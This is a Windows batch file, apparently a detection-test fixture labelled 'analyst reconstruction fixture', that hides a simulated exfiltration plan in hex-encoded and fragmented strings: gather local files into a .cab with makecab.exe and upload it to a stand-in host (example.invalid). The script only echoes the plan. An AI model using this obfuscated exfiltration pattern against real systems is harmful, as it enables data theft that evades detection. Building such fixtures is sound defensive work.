@echo off
setlocal EnableExtensions EnableDelayedExpansion
rem HUNTRESS-CODEC:hex_pairs|rotate_left
rem HUNTRESS-MATERIAL:ec7a62f8e6e8cae0e67ad8dec6c2e8cabed8dec6c2d858e0e4cae0c2e4cabee8e4c2dce6cccae458eae0d8dec2c8bee4cadadee8caf8c2c8c2e0e8cae47adac2d6cac6c2c45ccaf0caf8e6e8c2cecabec6deeadce87a62f8cee4c2e0d07ae6d2dcced8caf8dccaf0e8bed8c2dcceeac2ceca7adcdedccaf8c6c2dae0c2d2cedcbed2c87ac6c2dae0c2d2cedc5a6aca666a6272cc666460f8e6deeae4c6cabee0c2e8d07a8674b8aae6cae4e6b8a0eac4d8d2c6b890eadce8e4cae6e698c2c4b8c6ded8d8cac6e85a6aca666a6272cc6664605cc6c2c4f8eae0d8dec2c8beeae4d87ad0e8e8e0e6745e5e6aca666a6272cc6664605ccaf0c2dae0d8ca5cd2dcecc2d8d2c85eeae0d8dec2c8
rem analyst reconstruction fixture
rem HUNTRESS-EXTENSION:cmd
if /i "%~1"=="--inspect" goto :HUNTRESS_INSPECT
if /i "%~1"=="--plan" goto :HUNTRESS_PLAN
exit /b 0
:HUNTRESS_INSPECT
set "FrAg0=v=1|steps=locate_local,prepare_transfer,upload_remote|adapter=makec"& rem HUNTRESS quote compound
set "FrAg1=ab.exe|stage_count=1|graph=single|next_language=none|campaign_id=ca"& rem HUNTRESS quote compound
set "FrAg2=mpaign-5e3519f320|source_path=C:\Users\Public\HuntressLab\collect-5"& rem HUNTRESS quote compound
set "FrAg3=e3519f320.cab|upload_url=https://5e3519f320.example.invalid/upload"& rem HUNTRESS quote compound
goto :HUNTRESS_SEPARATOR_DONE
echo HUNTRESS_SEPARATOR | findstr HUNTRESS >nul
:HUNTRESS_SEPARATOR_DONE
set "neutral_environment_probe=12d3aacb"
set "ReCoVeReD="
for %%G in (0 1 2 3) do call set "ReCoVeReD=%%ReCoVeReD%%%%FrAg%%G%%"
echo(!ReCoVeReD!
exit /b 0
:HUNTRESS_PLAN
echo makecab.exe upload C:\Users\Public\HuntressLab\collect-5e3519f320.cab to https://5e3519f320.example.invalid/upload
exit /b 0
